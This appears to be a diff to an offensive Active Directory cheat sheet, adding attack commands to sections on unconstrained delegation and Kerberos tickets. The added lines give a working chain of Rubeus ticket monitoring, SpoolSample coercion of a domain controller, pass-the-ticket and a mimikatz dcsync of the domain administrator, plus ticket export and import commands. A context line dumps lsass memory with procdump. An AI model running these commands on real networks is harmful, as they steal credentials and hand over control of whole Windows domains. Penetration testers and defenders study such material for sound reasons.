@@ -635,7 +635,11 @@ $Descriptor.DiscretionaryAcl
 # Unconstrained Delegation
 # Prereqs: machine's userAccountControl attribute contains ADS_UF_TRUSTED_FOR_DELEGATION
 Get-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol -verbose | ft -a
-LDAP filter of '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
+# LDAP filter of '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
+rubeus.exe monitor /interval:1 /filtuser:reddc$ /nowrap
+Spoolsample.exe reddc redsqlw
+rubeus.exe ptt /ticket:[ticket]
+mimikatz # lsadump::dcsync /domain:red.com /user:RED\administrator
 
 # SPN Jacking
 # Prereqs: So pwn KCD, WriteSPN||GenericWrite||GenericAll Privs on ServerB SPN (if live jacking needed), WriteSPN||GenericWrite||GenericAll over ServerC (target) 
@@ -835,6 +839,14 @@ Rubeus ptt /luid:0xdeadbeef /ticket:<ticket>
 # Pass the Ticket
 kerberos::ptc Administrator.ccache
 misc::cmd
+
+# Export Ticket
+sekurlsa::tickets /export
+rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+
+# Import Ticket
+kerberos::ptt ticket.kirbi
+rubeus.exe /ptt /ticket: [doIF…]
 
 # Quick PE
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
